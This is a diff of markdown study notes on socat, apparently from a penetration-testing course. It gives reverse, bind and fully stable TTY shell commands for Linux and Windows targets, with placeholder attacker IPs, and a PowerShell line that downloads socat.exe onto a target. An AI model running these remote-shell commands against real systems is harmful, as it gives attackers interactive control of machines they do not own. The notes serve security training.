@@ -245,47 +245,70 @@ Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe)
 
 ## Socat
 * Connector between two points.
-* This will essentially be a listening port and the keyboard, however, it could also be a listening port and a file, or indeed, two listening ports.
-* All socat does is provide a link between two points.
+  * Listening port and the keyboard.
+  * Could also be a listening port and a file, or two listening ports.
 
 ### Reverse Shells
-* Here's the syntax for a basic reverse shell listener in socat: socat TCP-L:<port> -
-* This is taking two points (a listening port, and standard input) and connecting them together.
-* The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to nc -lvnp <port>.
-* On Windows we would use this command to connect back: socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
-* The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.
-* This is the equivalent command for a Linux target: socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
+* Basic reverse shell listener syntax.
+```
+socat TCP-L:<port> -
+```
+* Takes two points (a listening port, and standard input) and connects them together.
+* Resulting shell is unstable and is equivalent to `nc -lvnp <port>`.
+* Syntax for Windows target to connect back to listener.
+```
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
+```
+* 'pipes' is used to force powershell (or cmd.exe) to use Unix style standard input and output.
+* Syntax for Linux target to connect back to listener.
+```
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
+```
 
 ### Bind Shells
-* On a Linux target we would use the following command: socat TCP-L:<PORT> EXEC:"bash -li"
-* On a Windows target we would use this command for our listener: socat TCP-L:<PORT> EXEC:powershell.exe,pipes
-* We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.
-* Regardless of the target, we use this command on our attacking machine to connect to the waiting listener: socat TCP:<TARGET-IP>:<TARGET-PORT> -
-* Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell.
-* This will only work when the target is Linux, but is significantly more stable.
-* Here is the new listener syntax: socat TCP-L:<port> FILE:`tty`,raw,echo=0
-* We're connecting a listening port, and a file.
-* Specifically, we are passing in the current TTY as a file and setting the echo to be zero.
-* This is approximately equivalent to using the Ctrl+Z, stty raw -echo; fg trick with a netcat shell with the added bonus of being immediately stable and hooking into a full tty.
-* The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command.
-* This means that the target must have socat installed.
-* Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary, which can then be executed as normal.
-* The special command is: socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
-* The first part is easy -- we're linking up with the listener running on our own machine.
-* The second part of the command creates an interactive bash session with:  EXEC:"bash -li".
-* We're also passing the arguments: pty, stderr, sigint, setsid and sane:
-* pty, allocates a pseudoterminal on the target -- part of the stabilisation process
-* stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
-* sigint, passes any Ctrl+C commands through into the sub-process, allowing us to kill commands inside the shell
-* setsid, creates the process in a new session
-* sane, stabilises the terminal, attempting to "normalise" it.
+* Create a listener on a Linux target.
+```
+socat TCP-L:<PORT> EXEC:"bash -li"
+```
+* Create a listener on a Windows target.
+```
+socat TCP-L:<PORT> EXEC:powershell.exe,pipes
+```
+* 'pipes' used to interface between the Unix and Windows ways of handling input and output in a CLI environment.
+* Connect to the waiting listener from the attacking machine.
+```
+socat TCP:<TARGET-IP>:<TARGET-PORT> -
+```
+* Socat can create a fully stable Linux tty reverse shell.
+```
+socat TCP-L:<port> FILE:`tty`,raw,echo=0
+```
+* Socat connects a listening port and a file.
+  * Passing in the current TTY as a file and setting the echo to be zero.
+  * Equivalent to using the `Ctrl+Z`, `stty raw -echo; fg` trick with a netcat shell.
+* First listener can be connected to with any payload.
+* Special listener must be activated with a very specific socat command.
+  * Most machines do not have socat installed by default.
+  * Upload a precompiled socat binary that can then be executed as normal.
+```
+socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+```
+* Create an interactive bash session.
+```
+EXEC:"bash -li".
+```
+* Pass arguments.
+```
+pty, stderr, sigint, setsid and sane:
+```
+* `pty` allocates a pseudoterminal on the target.
+  * Part of the stabilisation process.
+* `stderr` makes sure that any error messages get shown in the shell.
+  * Often a problem with non-interactive shells.
+* `sigint` passes any `Ctrl+C` commands through into the sub-process allowing commands to be killed inside the shell.
+* `setsid` creates the process in a new session.
+* `sane` stabilises the terminal attempting to 'normalise' it.
 * On the left of the image below we have a listener running on our local attacking machine.
-* On the right we have a simulation of a compromised target, running with a non-interactive shell.
-* Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left:
-* Note that the socat shell is fully interactive, allowing us to use interactive commands such as SSH.
-* This can then be further improved by setting the stty valuesm which will let us use text editors such as Vim or Nano.
-* If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding -d -d into the command.
-* This is very useful for experimental purposes, but is not usually necessary for general use.
 
 ### Socat Encrypted Shells
 * One of the many great things about socat is that it's capable of creating encrypted bind and reverse shells.
